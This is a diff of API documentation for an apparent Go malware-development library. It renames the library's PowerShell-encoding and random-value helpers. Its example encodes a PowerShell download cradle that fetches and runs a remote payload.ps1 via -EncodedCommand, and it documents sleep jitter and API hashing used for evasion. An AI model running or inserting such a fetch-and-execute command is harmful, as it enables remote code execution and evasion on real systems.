@@ -213,10 +213,10 @@ utf16bytes := encode.ToUTF16LE("Hello")
 // utf16bytes = [0x48, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x6F, 0x00]
 ```
 
-### EncodePowerShell
+### PowerShell
 
 ```go
-func EncodePowerShell(script string) string
+func PowerShell(script string) string
 ```
 
 **Purpose:** Encodes a PowerShell script for use with `powershell.exe -EncodedCommand`.
@@ -226,7 +226,7 @@ func EncodePowerShell(script string) string
 ```go
 import "github.com/oioio-space/maldev/encode"
 
-encoded := encode.EncodePowerShell("IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')")
+encoded := encode.PowerShell("IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')")
 // Execute: powershell.exe -EncodedCommand <encoded>
 ```
 
@@ -320,10 +320,10 @@ h := hash.ROR13Module("kernel32.dll")
 
 All functions in this package use `crypto/rand`, not `math/rand`. The output is suitable for cryptographic key generation.
 
-### RandomString
+### String
 
 ```go
-func RandomString(length int) (string, error)
+func String(length int) (string, error)
 ```
 
 **Purpose:** Generates a random alphanumeric string (a-z, A-Z, 0-9).
@@ -333,13 +333,13 @@ func RandomString(length int) (string, error)
 ```go
 import "github.com/oioio-space/maldev/random"
 
-name, _ := random.RandomString(16) // e.g., "kR7xLm2NpQ4wYz9a"
+name, _ := random.String(16) // e.g., "kR7xLm2NpQ4wYz9a"
 ```
 
-### RandomBytes
+### Bytes
 
 ```go
-func RandomBytes(n int) ([]byte, error)
+func Bytes(n int) ([]byte, error)
 ```
 
 **Purpose:** Returns `n` cryptographically random bytes.
@@ -347,13 +347,13 @@ func RandomBytes(n int) ([]byte, error)
 **When to use:** Generating encryption keys, nonces, or random padding.
 
 ```go
-key, _ := random.RandomBytes(32) // 256-bit key
+key, _ := random.Bytes(32) // 256-bit key
 ```
 
-### RandomInt
+### Int
 
 ```go
-func RandomInt(min, max int) (int, error)
+func Int(min, max int) (int, error)
 ```
 
 **Purpose:** Returns a random integer in `[min, max)`.
@@ -361,13 +361,13 @@ func RandomInt(min, max int) (int, error)
 **When to use:** Random sleep jitter, random port selection, random array index.
 
 ```go
-jitter, _ := random.RandomInt(1000, 5000) // 1-5 seconds in ms
+jitter, _ := random.Int(1000, 5000) // 1-5 seconds in ms
 ```
 
-### RandomDuration
+### Duration
 
 ```go
-func RandomDuration(min, max time.Duration) (time.Duration, error)
+func Duration(min, max time.Duration) (time.Duration, error)
 ```
 
 **Purpose:** Returns a random `time.Duration` in `[min, max)`.
@@ -377,7 +377,7 @@ func RandomDuration(min, max time.Duration) (time.Duration, error)
 ```go
 import "time"
 
-sleep, _ := random.RandomDuration(5*time.Second, 30*time.Second)
+sleep, _ := random.Duration(5*time.Second, 30*time.Second)
 time.Sleep(sleep)
 ```
 
